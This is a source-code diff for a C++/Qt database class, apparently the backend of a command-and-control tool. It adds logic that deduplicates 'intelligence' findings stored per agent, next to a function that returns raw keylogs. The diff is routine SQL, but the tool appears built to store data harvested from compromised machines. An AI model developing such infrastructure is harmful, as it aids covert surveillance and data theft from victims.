@@ -1,4 +1,4 @@
-#include "../include/Inferno_Database.hpp"
+#include "../../include/database/Inferno_Database.hpp"
 #include <QtSql/QSqlError>
 #include <QtSql/QSqlDriver>
 #include <QtSql/QSqlField>
@@ -386,8 +386,75 @@ QString Inferno_Database::getRawKeylogsChronological(const QString& uuid) {
 
 bool Inferno_Database::logIntelligence(const QString& uuid, const QString& type, const QString& value, const QString& context) {
     if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") return false;
-    QSqlQuery query(m_db);
 
+    // Fetch all existing intelligence findings of this type for this agent
+    QSqlQuery checkQuery(m_db);
+    checkQuery.prepare("SELECT id, value FROM intelligence WHERE agent_uuid = :uuid AND data_type = :type");
+    checkQuery.bindValue(":uuid", uuid);
+    checkQuery.bindValue(":type", type);
+    
+    if (!checkQuery.exec()) {
+        qDebug() << "[Database] Error querying existing intelligence for duplicates:" << checkQuery.lastError().text();
+    } else {
+        bool shouldDiscard = false;
+        QList<int> idsToUpdate;
+        QList<int> idsToDelete;
+        
+        while (checkQuery.next()) {
+            int id = checkQuery.value(0).toInt();
+            QString existingVal = checkQuery.value(1).toString();
+            
+            if (existingVal == value) {
+                shouldDiscard = true;
+                break;
+            }
+            
+            // If the database already contains a longer/more complete version, discard this one
+            if (existingVal.contains(value)) {
+                shouldDiscard = true;
+                break;
+            }
+            
+            // If this new value is a longer/more complete version of an existing finding
+            if (value.contains(existingVal)) {
+                if (idsToUpdate.isEmpty()) {
+                    idsToUpdate.append(id);
+                } else {
+                    idsToDelete.append(id);
+                }
+            }
+        }
+        
+        if (shouldDiscard) {
+            return false; // Discarded, not a new finding
+        }
+        
+        if (!idsToUpdate.isEmpty()) {
+            // Update the first matching substring entry to the new value
+            QSqlQuery updateQuery(m_db);
+            updateQuery.prepare("UPDATE intelligence SET value = :value, context = :context, timestamp = CURRENT_TIMESTAMP WHERE id = :id");
+            updateQuery.bindValue(":value", value);
+            updateQuery.bindValue(":context", context);
+            updateQuery.bindValue(":id", idsToUpdate.first());
+            
+            if (!updateQuery.exec()) {
+                qDebug() << "[Database] Error updating intelligence substring match:" << updateQuery.lastError().text();
+                return false;
+            }
+            
+            // Delete any subsequent substring entries that are also merged into the new value
+            for (int delId : idsToDelete) {
+                QSqlQuery deleteQuery(m_db);
+                deleteQuery.prepare("DELETE FROM intelligence WHERE id = :id");
+                deleteQuery.bindValue(":id", delId);
+                deleteQuery.exec();
+            }
+            
+            return true; // Successfully updated/merged
+        }
+    }
+
+    QSqlQuery query(m_db);
     QSqlField f_uuid("", QMetaType::fromType<QString>()); f_uuid.setValue(uuid);
     QSqlField f_type("", QMetaType::fromType<QString>()); f_type.setValue(type);
     QSqlField f_value("", QMetaType::fromType<QString>()); f_value.setValue(value);
